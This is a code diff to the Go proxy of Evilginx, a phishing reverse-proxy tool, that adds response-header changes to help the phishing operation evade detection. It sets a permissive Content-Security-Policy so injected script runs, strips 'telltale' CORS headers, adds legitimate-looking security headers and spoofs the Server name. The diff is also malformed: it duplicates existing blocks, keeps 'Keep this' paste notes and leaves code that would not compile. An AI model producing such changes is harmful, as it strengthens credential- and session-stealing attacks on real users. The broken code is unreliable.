@@ -998,6 +998,37 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Del(hdr)
 			}
 
+			// (This is the existing loop around line 703 - Keep this)
+			for _, hdr := range rm_headers {
+				resp.Header.Del(hdr)
+			}
+
+			// --- START HEADER MODIFICATIONS ---
+			
+			// 1. Add Permissive Content-Security-Policy
+			// "default-src *" allows resources from ANY domain (prevents broken pages).
+			// 'unsafe-inline' and 'unsafe-eval' are required for Evilginx injection to work.
+			resp.Header.Set("Content-Security-Policy", "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;")
+
+			// 2. Add Referrer-Policy
+			resp.Header.Set("Referrer-Policy", "no-referrer")
+
+			// 3. Remove telltale CORS headers
+			// (This overrides the logic usually found earlier in the file)
+			resp.Header.Del("Access-Control-Allow-Origin")
+			resp.Header.Del("Access-Control-Allow-Credentials")
+
+			// 4. Add legitimate-looking headers
+			resp.Header.Set("X-Frame-Options", "SAMEORIGIN")
+			resp.Header.Set("X-Content-Type-Options", "nosniff")
+			resp.Header.Set("Server", "Apache") // Optional: Spoof the server name to look generic
+			
+			// --- END HEADER MODIFICATIONS ---
+
+			// (This is the existing code after your new block - Keep this)
+			redirect_set := false
+			if s, ok := p.sessions[ps.SessionId]; ok {
+
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
 				if s.RedirectURL != "" {
